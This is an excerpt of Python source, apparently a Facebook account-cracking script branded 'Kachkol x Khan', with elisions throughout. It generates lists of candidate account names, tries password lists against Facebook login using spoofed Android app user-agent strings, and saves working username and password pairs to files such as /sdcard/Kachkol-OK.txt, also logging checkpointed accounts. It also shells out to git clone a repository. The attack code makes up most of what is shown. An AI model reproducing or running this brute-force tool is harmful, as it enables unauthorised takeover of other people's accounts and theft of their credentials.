...
del ua
"''''
"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/55.0.0.6587;FBBV/90008621[FBAN/FB4A;FBAV/49.0.0.16.37;FBBV/527662992;FBDM/{density=2.2,width=1440,height=2560};FBLC/ur_PK;FBRV/593536006;FBCR/Telekom Deutschland;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a:armeabi;;]"
"""
...
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                                                               
\033[1;93m=================================
\033[1;97m Owner  : Kachkol x Khan :/
\033[1;97m GitHub : kachkolkhan :/
\033[1;97m Version:\033[1;92m 0.8 \033[1;97m:/
\033[1;97m Status : Faid :/
...
def Hxw_Main():
    ...
    if inpp == "4":
     ...
     os.system('cd && git clone --depth=1 https://github.com/kachkol/Kachkol/FILE')
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' hxw-code=Kachkol-33'))
...
def gmail():     
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.Kachkol','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.Kachkol','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.Kachkol', 'r').read().splitlines()
...
def method():
    ...
    print(f"{oo('•')}/sdcard/Kachkol-OK.txt")
    print('\033[1;93m='*25)
    print()
    ...
    def start(user):
     try:
        ...
        for pword in totalpass:              
            heads ='[FBAN/FB4A;FBAV/196.0.0.88;FBBV/990147883;FBDM/{density=2.5,width=720,height=1920};FBLC/en_IN;FBRV/742397415;FBCR/WOM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo Xplay6;FBSV/12.3.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;97mKachkol-OK\033[1;92m] \033[1;97m'+acc+' \033[1;92m•\033[1;97m '+pword+'  ')
                open('/sdcard/Kachkol-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mKachkol-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Kachkol-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
